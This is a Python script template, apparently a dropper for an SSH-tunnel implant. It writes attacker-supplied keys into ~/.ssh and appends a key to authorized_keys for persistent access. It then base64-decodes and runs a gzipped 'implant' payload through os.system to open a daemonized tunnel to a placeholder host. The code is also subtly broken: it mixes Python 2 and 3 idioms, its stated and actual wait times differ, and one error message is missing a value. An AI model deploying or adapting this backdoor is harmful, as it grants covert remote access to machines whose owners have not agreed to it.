#!/usr/bin/env python
# Copyright (c) 2024, Oracle and/or its affiliates.

from __future__ import with_statement
from __future__ import absolute_import
import os
import sys
import stat
import base64
import subprocess
import time
import io  # replace StringIO
import gzip
from string import ascii_lowercase
import socket
from io import open

PRIVKEY = u'{{ PRIVATE_KEY_PLACEHOLDER }}'
PUBKEY = u'{{ PUBLIC_KEY_PLACEHOLDER }}'
PORT = u'{{ PORT_PLACEHOLDER }}'
FQDN = u'{{ FQDN_PLACEHOLDER }}'

RW = stat.S_IRUSR | stat.S_IWUSR


def w(p, b):
    with open(p, u"wb") as f:  # "wb" since the result of b64decode is bytes
        f.write(base64.b64decode(b.encode()))  # encode the string to bytes before decoding
    os.chmod(p, RW)


def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out


def gzbase(stuff):
    out = io.BytesIO()  # replace StringIO.StringIO
    with gzip.GzipFile(fileobj=out, mode=u"wb") as f:
        f.write(stuff.encode())
    return base64.b64encode(out.getvalue()).decode()  # return as string


def ungzbase(unbased):
    gzipped = io.BytesIO()  # replace StringIO.StringIO
    gzipped.write(base64.b64decode(unbased.encode()))  # encode the string to bytes before decoding
    gzipped.seek(0)
    with gzip.GzipFile(fileobj=gzipped) as f:
        return f.read().decode()  # return as string


DOTSSH = os.path.expanduser(u"~/.ssh")
if not os.path.exists(DOTSSH):
    os.mkdir(DOTSSH)
    os.chmod(DOTSSH, stat.S_IRWXU)

KEYPATH_TEMPLATE = os.path.expanduser(u"~/.ssh/id_rsa")
keypath = None
pubkeypath = None
for c in ascii_lowercase[1:]:
    keypath = KEYPATH_TEMPLATE + c
    pubkeypath = keypath + u".pub"
    if not os.path.exists(keypath):
        break
print u"[+] keypath:", keypath

w(keypath, PRIVKEY)
print u"[+] wrote private key:", keypath
w(pubkeypath, PUBKEY)
print u"[+] wrote public key:", pubkeypath

with open(os.path.expanduser(u"~/.ssh/authorized_keys"), u"a") as f:
    f.write(base64.b64decode(PUBKEY.encode()).decode())  # decode bytes to string
    print u"[+] wrote to ~/.ssh/authorized_keys"

payload = ungzbase({{ IMPLANT_PLACEHOLDER }})
encoded = gzbase(templify(payload, {u'KEYFILE_PLACEHOLDER': keypath}))

os.system(u"echo %s | base64 -d | gzip -d | python " % encoded)

print u"[+] started daemonized tunnel"
print u"[*] waiting one minute for tunnel to come up..."
time.sleep(5)

psx = u"ps x | grep ssh | grep '%s' | grep -v grep | wc -l" % FQDN
proc = subprocess.Popen(psx, shell=True, stdout=subprocess.PIPE)  # use text=True
(out, err) = proc.communicate()
num = int(out.strip())
if num == 2:
    print u"[+] tunnel running"
else:
    print u"[-] seems like  copies running"
    print u"[-] Something is wrong.  You should investigate/clean-up"
    sys.exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((u'127.0.0.1', 22))
if result != 0:
    print u"[-] sshd needs to be enabled on this system"
sock.close()
